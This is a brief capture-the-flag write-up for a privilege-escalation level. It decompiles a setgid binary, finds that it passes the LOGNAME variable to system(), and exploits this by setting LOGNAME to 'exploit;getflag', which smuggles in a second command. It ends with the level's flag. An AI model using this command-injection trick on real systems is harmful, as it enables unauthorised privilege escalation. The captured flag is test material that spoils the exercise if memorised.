# level07

```shell
ls -la
```

shows that the level07 executable belongs to flag07 group, privilege escalation should be possible

```shell
scp -P 4242 level07@127.0.0.1:~/level06 .
```

```shell
~/dev/tools/retdec/bin/retdec-decompiler.py level07
```

shows `return system(buffer);` which permits arbitrary code execution pretty easily

```shell
LOGNAME='exploit;getflag'
```

```shell
./level07
```

gives flag:

```shell
fiumuikeil55xe9cu4dood66h
```
